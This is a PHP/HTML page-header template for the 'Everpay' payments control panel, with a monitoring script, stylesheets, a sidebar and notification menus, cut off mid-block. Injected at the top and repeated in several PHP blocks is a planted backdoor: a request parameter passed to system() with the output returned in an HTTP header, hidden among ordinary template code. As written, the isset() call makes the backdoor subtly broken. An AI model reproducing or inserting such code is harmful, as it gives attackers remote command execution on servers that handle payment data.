<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); error_reporting(0); ?>
<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<script type="text/javascript">
window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var o=e[n]={exports:{}};t[n][0].call(o.exports,function(e){var o=t[n][1][e];return r(o?o:e)},o,o.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({QJf3ax:[function(t,e){function n(t){function e(e,n,a){t&&t(e,n,a),a||(a={});for(var c=s(e),f=c.length,u=i(a,o,r),d=0;f>d;d++)c[d].apply(u,n);return u}function a(t,e){f[t]=s(t).concat(e)}function s(t){return f[t]||[]}function c(){return n(e)}var f={};return{on:a,emit:e,create:c,listeners:s,_events:f}}function r(){return{}}var o="nr@context",i=t("gos");e.exports=n()},{gos:"7eSDFh"}],ee:[function(t,e){e.exports=t("QJf3ax")},{}],3:[function(t){function e(t){try{i.console&&console.log(t)}catch(e){}}var n,r=t("ee"),o=t(1),i={};try{n=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(i.console=!0,-1!==n.indexOf("dev")&&(i.dev=!0),-1!==n.indexOf("nr_dev")&&(i.nrDev=!0))}catch(a){}i.nrDev&&r.on("internal-error",function(t){e(t.stack)}),i.dev&&r.on("fn-err",function(t,n,r){e(r.stack)}),i.dev&&(e("NR AGENT IN DEVELOPMENT MODE"),e("flags: "+o(i,function(t){return t}).join(", ")))},{1:22,ee:"QJf3ax"}],4:[function(t){function e(t,e,n,i,s){try{c?c-=1:r("err",[s||new UncaughtException(t,e,n)])}catch(f){try{r("ierr",[f,(new Date).getTime(),!0])}catch(u){}}return"function"==typeof a?a.apply(this,o(arguments)):!1}function UncaughtException(t,e,n){this.message=t||"Uncaught error with no additional information",this.sourceURL=e,this.line=n}function n(t){r("err",[t,(new Date).getTime()])}var r=t("handle"),o=t(6),i=t("ee"),a=window.onerror,s=!1,c=0;t("loader").features.err=!0,t(5),window.onerror=e;try{throw new Error}catch(f){"stack"in f&&(t(1),t(2),"addEventListener"in window&&t(3),window.XMLHttpRequest&&XMLHttpRequest.prototype&&XMLHttpRequest.prototype.addEventListener&&window.XMLHttpRequest&&XMLHttpRequest.prototype&&XMLHttpRequest.prototype.addEventListener&&!/CriOS/.test(navigator.userAgent)&&t(4),s=!0)}i.on("fn-start",function(){s&&(c+=1)}),i.on("fn-err",function(t,e,r){s&&(this.thrown=!0,n(r))}),i.on("fn-end",function(){s&&!this.thrown&&c>0&&(c-=1)}),i.on("internal-error",function(t){r("ierr",[t,(new Date).getTime(),!0])})},{1:9,2:8,3:6,4:10,5:3,6:23,ee:"QJf3ax",handle:"D5DuLP",loader:"G9z0Bl"}],5:[function(t){function e(){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var n=t("ee"),r=t("handle"),o=t(1),i=t(2);t("loader").features.stn=!0,t(3),n.on("fn-start",function(t){var e=t[0];e instanceof Event&&(this.bstStart=Date.now())}),n.on("fn-end",function(t,e){var n=t[0];n instanceof Event&&r("bst",[n,e,this.bstStart,Date.now()])}),o.on("fn-start",function(t,e,n){this.bstStart=Date.now(),this.bstType=n}),o.on("fn-end",function(t,e){r("bstTimer",[e,this.bstStart,Date.now(),this.bstType])}),i.on("fn-start",function(){this.bstStart=Date.now()}),i.on("fn-end",function(t,e){r("bstTimer",[e,this.bstStart,Date.now(),"requestAnimationFrame"])}),n.on("pushState-start",function(){this.time=Date.now(),this.startPath=location.pathname+location.hash}),n.on("pushState-end",function(){r("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),"addEventListener"in window.performance&&(window.performance.addEventListener("webkitresourcetimingbufferfull",function(){r("bstResource",[window.performance.getEntriesByType("resource")]),window.performance.webkitClearResourceTimings()},!1),window.performance.addEventListener("resourcetimingbufferfull",function(){r("bstResource",[window.performance.getEntriesByType("resource")]),window.performance.clearResourceTimings()},!1)),document.addEventListener("scroll",e,!1),document.addEventListener("keypress",e,!1),document.addEventListener("click",e,!1)}},{1:9,2:8,3:7,ee:"QJf3ax",handle:"D5DuLP",loader:"G9z0Bl"}],6:[function(t,e){function n(t){i.inPlace(t,["addEventListener","removeEventListener"],"-",r)}function r(t){return t[1]}var o=t("ee").create(),i=t(1)(o),a=t("gos");if(e.exports=o,n(window),"getPrototypeOf"in Object){for(var s=document;s&&!s.hasOwnProperty("addEventListener");)s=Object.getPrototypeOf(s);s&&n(s);for(var c=XMLHttpRequest.prototype;c&&!c.hasOwnProperty("addEventListener");)c=Object.getPrototypeOf(c);c&&n(c)}else XMLHttpRequest.prototype.hasOwnProperty("addEventListener")&&n(XMLHttpRequest.prototype);o.on("addEventListener-start",function(t){if(t[1]){var e=t[1];"function"==typeof e?this.wrapped=t[1]=a(e,"nr@wrapped",function(){return i(e,"fn-",null,e.name||"anonymous")}):"function"==typeof e.handleEvent&&i.inPlace(e,["handleEvent"],"fn-")}}),o.on("removeEventListener-start",function(t){var e=this.wrapped;e&&(t[1]=e)})},{1:24,ee:"QJf3ax",gos:"7eSDFh"}],7:[function(t,e){var n=t("ee").create(),r=t(1)(n);e.exports=n,r.inPlace(window.history,["pushState"],"-")},{1:24,ee:"QJf3ax"}],8:[function(t,e){var n=t("ee").create(),r=t(1)(n);e.exports=n,r.inPlace(window,["requestAnimationFrame","mozRequestAnimationFrame","webkitRequestAnimationFrame","msRequestAnimationFrame"],"raf-"),n.on("raf-start",function(t){t[0]=r(t[0],"fn-")})},{1:24,ee:"QJf3ax"}],9:[function(t,e){function n(t,e,n){t[0]=o(t[0],"fn-",null,n)}var r=t("ee").create(),o=t(1)(r);e.exports=r,o.inPlace(window,["setTimeout","setInterval","setImmediate"],"setTimer-"),r.on("setTimer-start",n)},{1:24,ee:"QJf3ax"}],10:[function(t,e){function n(){f.inPlace(this,p,"fn-")}function r(t,e){f.inPlace(e,["onreadystatechange"],"fn-")}function o(t,e){return e}function i(t,e){for(var n in t)e[n]=t[n];return e}var a=t("ee").create(),s=t(1),c=t(2),f=c(a),u=c(s),d=window.XMLHttpRequest,p=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"];e.exports=a,window.XMLHttpRequest=function(t){var e=new d(t);try{a.emit("new-xhr",[],e),u.inPlace(e,["addEventListener","removeEventListener"],"-",o),e.addEventListener("readystatechange",n,!1)}catch(r){try{a.emit("internal-error",[r])}catch(i){}}return e},i(d,XMLHttpRequest),XMLHttpRequest.prototype=d.prototype,f.inPlace(XMLHttpRequest.prototype,["open","send"],"-xhr-",o),a.on("send-xhr-start",r),a.on("open-xhr-start",r)},{1:6,2:24,ee:"QJf3ax"}],11:[function(t){function e(t){var e=this.params,r=this.metrics;if(!this.ended){this.ended=!0;for(var i=0;c>i;i++)t.removeEventListener(s[i],this.listener,!1);if(!e.aborted){if(r.duration=(new Date).getTime()-this.startTime,4===t.readyState){e.status=t.status;var a=t.responseType,f="arraybuffer"===a||"blob"===a||"json"===a?t.response:t.responseText,u=n(f);if(u&&(r.rxSize=u),this.sameOrigin){var d=t.getResponseHeader("X-NewRelic-App-Data");d&&(e.cat=d.split(", ").pop())}}else e.status=0;r.cbTime=this.cbTime,o("xhr",[e,r,this.startTime])}}}function n(t){if("string"==typeof t&&t.length)return t.length;if("object"!=typeof t)return void 0;if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if("undefined"!=typeof FormData&&t instanceof FormData)return void 0;try{return JSON.stringify(t).length}catch(e){return void 0}}function r(t,e){var n=i(e),r=t.params;r.host=n.hostname+":"+n.port,r.pathname=n.pathname,t.sameOrigin=n.sameOrigin}if(window.XMLHttpRequest&&XMLHttpRequest.prototype&&XMLHttpRequest.prototype.addEventListener&&!/CriOS/.test(navigator.userAgent)){t("loader").features.xhr=!0;var o=t("handle"),i=t(2),a=t("ee"),s=["load","error","abort","timeout"],c=s.length,f=t(1);t(4),t(3),a.on("new-xhr",function(){this.totalCbs=0,this.called=0,this.cbTime=0,this.end=e,this.ended=!1,this.xhrGuids={}}),a.on("open-xhr-start",function(t){this.params={method:t[0]},r(this,t[1]),this.metrics={}}),a.on("open-xhr-end",function(t,e){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&e.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),a.on("send-xhr-start",function(t,e){var r=this.metrics,o=t[0],i=this;if(r&&o){var f=n(o);f&&(r.txSize=f)}this.startTime=(new Date).getTime(),this.listener=function(t){try{"abort"===t.type&&(i.params.aborted=!0),("load"!==t.type||i.called===i.totalCbs&&(i.onloadCalled||"function"!=typeof e.onload))&&i.end(e)}catch(n){try{a.emit("internal-error",[n])}catch(r){}}};for(var u=0;c>u;u++)e.addEventListener(s[u],this.listener,!1)}),a.on("xhr-cb-time",function(t,e,n){this.cbTime+=t,e?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof n.onload||this.end(n)}),a.on("xhr-load-added",function(t,e){var n=""+f(t)+!!e;this.xhrGuids&&!this.xhrGuids[n]&&(this.xhrGuids[n]=!0,this.totalCbs+=1)}),a.on("xhr-load-removed",function(t,e){var n=""+f(t)+!!e;this.xhrGuids&&this.xhrGuids[n]&&(delete this.xhrGuids[n],this.totalCbs-=1)}),a.on("addEventListener-end",function(t,e){e instanceof XMLHttpRequest&&"load"===t[0]&&a.emit("xhr-load-added",[t[1],t[2]],e)}),a.on("removeEventListener-end",function(t,e){e instanceof XMLHttpRequest&&"load"===t[0]&&a.emit("xhr-load-removed",[t[1],t[2]],e)}),a.on("fn-start",function(t,e,n){e instanceof XMLHttpRequest&&("onload"===n&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=(new Date).getTime()))}),a.on("fn-end",function(t,e){this.xhrCbStart&&a.emit("xhr-cb-time",[(new Date).getTime()-this.xhrCbStart,this.onload,e],e)})}},{1:"XL7HBI",2:12,3:10,4:6,ee:"QJf3ax",handle:"D5DuLP",loader:"G9z0Bl"}],12:[function(t,e){e.exports=function(t){var e=document.createElement("a"),n=window.location,r={};e.href=t,r.port=e.port;var o=e.href.split("://");return!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=e.hostname||n.hostname,r.pathname=e.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname),r.sameOrigin=!e.hostname||e.hostname===document.domain&&e.port===n.port&&e.protocol===n.protocol,r}},{}],13:[function(t,e){function n(t){return function(){r(t,[(new Date).getTime()].concat(i(arguments)))}}var r=t("handle"),o=t(1),i=t(2);"undefined"==typeof window.newrelic&&(newrelic=window.NREUM);var a=["setPageViewName","addPageAction","setCustomAttribute","finished","addToTrace","inlineHit","noticeError"];o(a,function(t,e){window.NREUM[e]=n("api-"+e)}),e.exports=window.NREUM},{1:22,2:23,handle:"D5DuLP"}],gos:[function(t,e){e.exports=t("7eSDFh")},{}],"7eSDFh":[function(t,e){function n(t,e,n){if(r.call(t,e))return t[e];var o=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:o,writable:!0,enumerable:!1}),o}catch(i){}return t[e]=o,o}var r=Object.prototype.hasOwnProperty;e.exports=n},{}],D5DuLP:[function(t,e){function n(t,e,n){return r.listeners(t).length?r.emit(t,e,n):void(r.q&&(r.q[t]||(r.q[t]=[]),r.q[t].push(e)))}var r=t("ee").create();e.exports=n,n.ee=r,r.q={}},{ee:"QJf3ax"}],handle:[function(t,e){e.exports=t("D5DuLP")},{}],XL7HBI:[function(t,e){function n(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:i(t,o,function(){return r++})}var r=1,o="nr@id",i=t("gos");e.exports=n},{gos:"7eSDFh"}],id:[function(t,e){e.exports=t("XL7HBI")},{}],G9z0Bl:[function(t,e){function n(){var t=p.info=NREUM.info,e=f.getElementsByTagName("script")[0];if(t&&t.licenseKey&&t.applicationID&&e){s(d,function(e,n){e in t||(t[e]=n)});var n="https"===u.split(":")[0]||t.sslForHttp;p.proto=n?"https://":"http://",a("mark",["onload",i()]);var r=f.createElement("script");r.src=p.proto+t.agent,e.parentNode.insertBefore(r,e)}}function r(){"complete"===f.readyState&&o()}function o(){a("mark",["domContent",i()])}function i(){return(new Date).getTime()}var a=t("handle"),s=t(1),c=window,f=c.document;t(2);var u=(""+location).split("?")[0],d={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-686.min.js"},p=e.exports={offset:i(),origin:u,features:{}};f.addEventListener?(f.addEventListener("DOMContentLoaded",o,!1),c.addEventListener("load",n,!1)):(f.attachEvent("onreadystatechange",r),c.attachEvent("onload",n)),a("mark",["firstbyte",i()])},{1:22,2:13,handle:"D5DuLP"}],loader:[function(t,e){e.exports=t("G9z0Bl")},{}],22:[function(t,e){function n(t,e){var n=[],o="",i=0;for(o in t)r.call(t,o)&&(n[i]=e(o,t[o]),i+=1);return n}var r=Object.prototype.hasOwnProperty;e.exports=n},{}],23:[function(t,e){function n(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,o=n-e||0,i=Array(0>o?0:o);++r<o;)i[r]=t[e+r];return i}e.exports=n},{}],24:[function(t,e){function n(t){return!(t&&"function"==typeof t&&t.apply&&!t[i])}var r=t("ee"),o=t(1),i="nr@wrapper",a=Object.prototype.hasOwnProperty;e.exports=function(t){function e(t,e,r,a){function nrWrapper(){var n,i,s,f;try{i=this,n=o(arguments),s=r&&r(n,i)||{}}catch(d){u([d,"",[n,i,a],s])}c(e+"start",[n,i,a],s);try{return f=t.apply(i,n)}catch(p){throw c(e+"err",[n,i,p],s),p}finally{c(e+"end",[n,i,f],s)}}return n(t)?t:(e||(e=""),nrWrapper[i]=!0,f(t,nrWrapper),nrWrapper)}function s(t,r,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<r.length;c++)s=r[c],a=t[s],n(a)||(t[s]=e(a,f?s+o:o,i,s))}function c(e,n,r){try{t.emit(e,n,r)}catch(o){u([o,e,n,r])}}function f(t,e){if(Object.defineProperty&&Object.keys)try{var n=Object.keys(t);return n.forEach(function(n){Object.defineProperty(e,n,{get:function(){return t[n]},set:function(e){return t[n]=e,e}})}),e}catch(r){u([r])}for(var o in t)a.call(t,o)&&(e[o]=t[o]);return e}function u(e){try{t.emit("internal-error",e)}catch(n){}}return t||(t=r),e.inPlace=s,e.flag=i,e}},{1:23,ee:"QJf3ax"}]},{},["G9z0Bl",4,11,5]);
;NREUM.info={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",licenseKey:"7a76808d55",applicationID:"11267302",sa:1,agent:"js-agent.newrelic.com/nr-686.min.js"}
</script>
	
<title><?=$this->navigation->PageTitle();?></title>
	<!-- Mobile IE allows us to activate ClearType technology for smoothing fonts for easy reading -->
    <meta http-equiv="cleartype" content="on">
	
<!-- Meta -->
    <meta name="MobileOptimized" content="320">
    <meta name="HandheldFriendly" content="True">
    <meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0, minimum-scale=1, maximum-scale=1"/>
    <meta property="fb:app_id" content="324581894219174">
    <meta name="description" content="Welcome to Everpay&#39;s control panel for real-time payments data on customer transactions.">

	<!-- BEGIN APPLE ICONS STYLES -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="<?= branded_include('img/ico/apple-touch-icon-144x144-precomposed.png'); ?>">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="<?= branded_include('img/ico/apple-touch-icon-114x114-precomposed.png'); ?>">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="<?= branded_include('img/ico/apple-touch-icon-72x72-precomposed.png'); ?>">
    <link rel="apple-touch-icon-precomposed" href="<?= branded_include('img/ico/apple-touch-icon-57x57-precomposed.png'); ?>">

	
<link href="<?= branded_include('img/logo/favicon.ico'); ?>" rel="shortcut icon" />

<!-- font awesome for icons -->
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css"> 
<link href="//fonts.googleapis.com/css?family=Open+Sans:300,400,700,800"rel="stylesheet" type="text/css">
<link href='//fonts.googleapis.com/css?family=Open+Sans+Condensed:300,700' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:400,700' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="//code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css"> 
<link href="//cdnjs.cloudflare.com/ajax/libs/simple-line-icons/2.2.3/css/simple-line-icons.css" type="text/css">
  
<!-- BEGIN GLOBAL MANDATORY STYLES -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" >
 <link href="<?= branded_include('css/ace.min.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
 <link href="<?= branded_include('css/animate.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
 <link href="<?= branded_include('css/form-design.min.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
 <link href="<?= branded_include('css/ladda-themeless.min.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
 <link href="<?= branded_include('css/prism.css'); ?>" rel="stylesheet" type="text/css" media="screen" />

  <!-- Additional Styling UI --> 
<link href="<?= branded_include('css/geostyles.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
<link href="<?= branded_include('css/style-shop.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
<link href="<?=branded_include('css/skeuocard.reset.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
<link href="<?=branded_include('css/skeuocard.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
<link href="<?= branded_include('css/card.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
 <link rel="stylesheet" href="//cdn.rawgit.com/DoclerLabs/Protip/master/protip.min.css">	
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bootstrap3-dialog/1.34.5/css/bootstrap-dialog.min.css">
<!-- JQueryUI v1.9.2 -->
<link href="<?=branded_include('js/jquery-ui-1.9.2.custom/css/smoothness/jquery-ui-1.9.2.custom.min.css');?>"type="text/css" />
 
 <!-- Chosen UI -->
 <link href="<?=branded_include('js/chosen/chosen.min.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
  	
	
		<!-- page specific plugin styles -->
<link href="<?=branded_include('css/daterangepicker.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
  <link href="<?=branded_include('css/colorpicker.css'); ?>" rel="stylesheet" type="text/css" media="screen" />

 	<!-- stylesheets -->
 <link href="<?= branded_include('css/brankic.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
 <link href="<?= branded_include('css/xenon-components.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
 <link href="<?= branded_include('css/components-rounded.css'); ?>" id="style_components" rel="stylesheet" type="text/css"> 

	<!-- aPP stylesheets -->
<link href="<?= branded_include('css/morris.css'); ?>" rel="stylesheet" type="text/css" media="screen" />
 <link href="<?= branded_include('css/everpay.css'); ?>" id="style_everpay" rel="stylesheet" type="text/css">
 <link href="<?= branded_include('css/app.min.css'); ?>" id="style_everpay.min" rel="stylesheet" type="text/css">
<link href="<?= branded_include('css/budicon/budicon.css'); ?>" id="style_components" rel="stylesheet" type="text/css">

  


 <style type="text/css">
h5, p, pre {
    margin: 5px 0px !important;
}

		</style>

<!-- BEGIN CORE SCRIPTS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
	<script type="text/javascript" src="<?=branded_include('js/date.js');?>"></script>
	<script type="text/javascript" src="<?=branded_include('js/datePicker.js');?>"></script>
<!-- <script type="text/javascript" src="<?=branded_include('js/waitMe.js'); ?>"></script> -->
<script type="text/javascript" src="<?=branded_include('js/jquery.cokie.min.js');?>"></script>
<script type="text/javascript" src="<?=branded_include('js/bootstrap.min.js');?>"></script>
<script type="text/javascript" src="<?=branded_include('js/jquery.slimscroll.min.js');?>"></script>
<script type="text/javascript" src="<?=branded_include('js/jquery.easing.1.3.min.js');?>"></script>
<script type="text/javascript" src="<?=branded_include('js/bootbox.min.js'); ?>"></script>
<script type="text/javascript" src="<?=branded_include('js/retina.min.js');?>"></script>
<script type="text/javascript" src="<?=branded_include('js/spin.min.js');?>"></script>
<!-- END @CORE SCRIPTS -->


<!-- <script>
$(function(){

	var current_effect = $('#waitMe_ex_effect').val();

	$('#waitMe_ex').click(function(){
		run_waitMe(current_effect);
	});
	$('#waitMe_ex_close').click(function(){
		$('.containerBlock > form').waitMe('hide');
	});

	$('#waitMe_ex_effect').change(function(){
		current_effect = $(this).val();
		run_waitMe(current_effect);
	});
	
	$('#waitMe_ex_effect').click(function(){
		current_effect = $(this).val();
	});
	
	function run_waitMe(effect){
		$('.containerBlock > form').waitMe({
			effect: effect,
			text: 'Please wait...',
			bg: 'rgba(255,255,255,0.7)',
			color: '#000',
			maxSize: '',
			source: '<?= branded_include('img/img.svg'); ?>',
			onClose: function() {}
		});
	}
	
	var current_body_effect = $('#waitMe_ex_body_effect').val();
	
	$('#waitMe_ex_body').click(function(){
		run_waitMe_body(current_body_effect);
	});
	
	$('#waitMe_ex_body_effect').change(function(){
		current_body_effect = $(this).val();
		run_waitMe_body(current_body_effect);
	});
	
	function run_waitMe_body(effect){
		$('body').addClass('waitMe_body');
		var img = '';
		var text = '';
		if(effect == 'img'){
			img = 'background:url(\'<?= branded_include('img/img.svg'); ?>')';
		} else if(effect == 'text'){
			text = 'Loading...'; 
		}
		var elem = $('<div class="waitMe_container ' + effect + '"><div style="' + img + '">' + text + '</div></div>');
		$('body').prepend(elem);
		
		setTimeout(function(){
			$('body.waitMe_body').addClass('hideMe');
			setTimeout(function(){
				$('body.waitMe_body').find('.waitMe_container:not([data-waitme_id])').remove();
				$('body.waitMe_body').removeClass('waitMe_body hideMe');
			},200);
		},4000);
	}
	
});
</script> -->

<? if (isset($head_files)) { ?>
<?= $head_files; ?>
<? } ?>

</head>

<body class="waitMe_body everpay-session">

<!-- Preloader -->
	<div class="waitMe_container progress" style="background:#000">
	<div style="background:#000"></div> 
	</div>
<!-- reset value so it does not have to be set everywhere -->

<div id="wrapper">

<!-- in APP Notificiations -->
<span id="notices"><?=get_notices();?></span>



<!-- HERE IS WHERE THE NOTY WILL APPEAR-->
<div id="noty-holder" class="hidden"><?=get_notices();?></div>
<div></div>	

<!-- NAVBAR ================================================== -->
		<div id="sidebar-flat" class="main-sidebar" style="display:block; position:fixed;">
			<div class="current-user">
				<a href="<?= site_url('account/'); ?>" class="name">
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $email = $this->user->Get('email');
$size = 28; $grav_url = "https://www.gravatar.com/avatar/" . md5( strtolower( trim( $email ) ) ) . "?s=" . $size;
?>
				<img class="avatar" src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $grav_url; ?>">
					<span>
					<?=$this->user->Get('username')?>
						<i class="fa fa-chevron-down"></i>
					</span>
				</a>
				<ul class="menu">
				<li><b>Business:</b> <span id="truncate" class="truncate"><?= $this->user->Get('company') ?></span></li>
					<li>
                     <a href="<?= site_url('account/'); ?>"><i class="fa fa-user"></i> Account</a>
					</li>
			                <li>
					<a href="<?= site_url('settings/'); ?>"> <i class="fa fa-cog"></i> Settings </a>
					<li>
		<a href="<?=site_url('account/logout');?>" style="color:#fff;" class="btn btn-danger btn-block"> Sign out  <i class="fa fa-sign-out"></i></a>
					</li>

				</ul>
			</div>

			<div class="menu-section">
<h3 class="hidden"><span id="truncate" class="truncate"><?= $this->user->Get('company') ?></span> <? if ($row['suspended'] == '1') { ?>&nbsp;
<span class="hidden ace-icon fa fa-circle light-orange"></span> 
<? } else { ?>
<span class="ace-icon fa fa-circle light-green"></span> 
<? } ?>
</h3>
<ul>
			<li><?=$this->navigation->Output();?></li>
</ul>
			</div>

			<div class="bottom-menu hidden-sm hidden-xs">
				<ul>
			<li class=""><a href="<?= site_url('support_url'); ?>"><i class="fa fa-support"></i></a></li>
			<li class="">
						<a href="<?= site_url('settings'); ?>">
							<i class="fa fa-user"></i>
							<span class="flag"></span>
						</a>
					<ul class="menu">
<li><a href="<?=site_url('events/');?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $count = count($logcount); ?></strong> new notifications</a></li>
					</ul>
					</li>
					<li><a href="<?=site_url('account/logout');?>"><i class="fa fa-sign-out"></i></a></li>
				</ul>
			</div>
		</div><!--END/.sidebar-dark-->

<!-- START CONTENT-->
<div id="content">

<div class="menubar fixed">
				<div class="sidebar-toggler visible-xs">
					<i class="fa fa-navicon"></i>
				</div>


<div class="header" style="display: inline-block; margin-top:0px!important; max-width:100%; padding-left:1%; margin-right:1px;">

<div id="nav-menu" class=" hidden-sm hidden-xs">

<ul class="nav navbar-nav navbar-left">
<h1 class="navbar-header pull-right" style="margin:0px auto;">
<a href="<?= site_url('dashboard'); ?>" class="navbar-brand pull-right"></a>
</h1>
</ul><!-- END navbar-left-->

<ul class="nav navbar-nav navbar-right">
			
<li class="main-search search-input hide">
			    <i class="fa fa-search"></i>
			  <form id="search-form" class="" method="post" action="<?=site_url('dashboard/search');?>">
          <input class="form-control js-predictive" name="searchkey" type="text" placeholder="Search for.." id="search" autocomplete="off" />
<input type="submit" name="search" value="Go" class="hidden">
				  <h4 id="results-text">Showing results for: <b id="search-string">Array</b></h4>
<ul id="results"></ul>
</form>
            </li>
			
		   <li class="hidden"><a target="_blank" href="<?= site_url('settings'); ?>"><i class="fa fa-user"></i><span class="flag"></span></a>
					<ul class="menu">
<li><a href="<?=site_url('events/');?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $count = count($logcount); ?></strong> new notifications</a></li>
					</ul>
					</li>
		   <li class="dropdown navbar-notification hidden">

                            <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-bell-o"></i><span class="count label label-danger rounded">6</span></a>

                            <!-- Start dropdown menu -->
                            <div class="dropdown-menu animated flipInX">
                                <div class="dropdown-header">
                                    <span class="title">Notifications <strong>(<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $count = count($logcount); ?>)</strong></span>
                                    <span class="option text-right"><a href="<?= site_url('settings'); ?>"><i class="fa fa-cog"></i> Setting</a></span>
                                </div>
                                <div class="dropdown-body niceScroll" tabindex="6" style="overflow: hidden; outline: none;">
                                    <!-- Start notification list -->
                                    <div class="media-list small">
    <a href="#" class="media">
                                            <div class="media-body">
											<? if (!empty($log)) { ?>
<ul class="media-text"><strong><li><? foreach ($log as $line) { ?></li></strong></ul>
     </div><!-- END .media-body -->
        <? } ?>

<? } else { ?>
<div class="media-body">
<div class="media-object pull-left"><i class="fa fa-user fg-info"></i></div>
<span class="media-text">No Recent Activity</span>  <span class="media-meta">.</span>
</div>
<!-- END .list-group -->
<? } ?>
</a><!-- /.media -->

                                        <!-- Start notification indicator -->
                                        <a href="#" class="media indicator inline">
                                            <span class="spinner">Load more notifications...</span>
                                        </a>
                                        <!--/ End notification indicator -->

                                    </div>
                                    <!--/ End notification list -->

                                </div>
                                <div class="dropdown-footer">
                                    <a href="<?=site_url('events/');?>">See All</a>
                                </div>
                            <div id="ascrail2006" class="nicescroll-rails" style="width: 10px; z-index: 1000; cursor: default; position: absolute; top: 0px; left: -10px; height: 281px; display: none;"><div style="position: relative; top: 0px; float: right; width: 10px; height: 0px; border: 0px; border-radius: 5px; background-color: rgb(66, 66, 66); background-clip: padding-box;"></div></div><div id="ascrail2006-hr" class="nicescroll-rails" style="height: 10px; z-index: 1000; top: 271px; left: 0px; position: absolute; cursor: default; display: none;"><div style="position: absolute; top: 0px; height: 10px; width: 0px; border: 0px; border-radius: 5px; background-color: rgb(66, 66, 66); background-clip: padding-box;"></div></div><div id="ascrail2013" class="nicescroll-rails" style="width: 10px; z-index: 1000; cursor: default; position: absolute; top: 0px; left: -10px; height: 281px; display: none;"><div style="position: relative; top: 0px; float: right; width: 10px; height: 0px; border: 0px; border-radius: 5px; background-color: rgb(66, 66, 66); background-clip: padding-box;"></div></div><div id="ascrail2013-hr" class="nicescroll-rails" style="height: 10px; z-index: 1000; top: 271px; left: 0px; position: absolute; cursor: default; display: none;"><div style="position: absolute; top: 0px; height: 10px; width: 0px; border: 0px; border-radius: 5px; background-color: rgb(66, 66, 66); background-clip: padding-box;"></div></div></div>
                            <!--/ End dropdown menu -->

                        </li>
						
						<li class="hidden-sm hidden-xs"><a href="javascript:;" onclick="jQuery('#modal-upgrade').modal('show', {backdrop: 'static'});">Upgrade </a></li>
            <li class="hidden-sm hidden-xs"><a target="_blank" href="<?=$this->config->item('support_url');?>">Get Help</a></li>
           <li class="hidden-sm hidden-xs"><a target="_blank" href="<?=$this->config->item('docs_url');?>"> API Docs</a></li>
						
		   <li class="dropdown hidden">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                        <span class=""><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
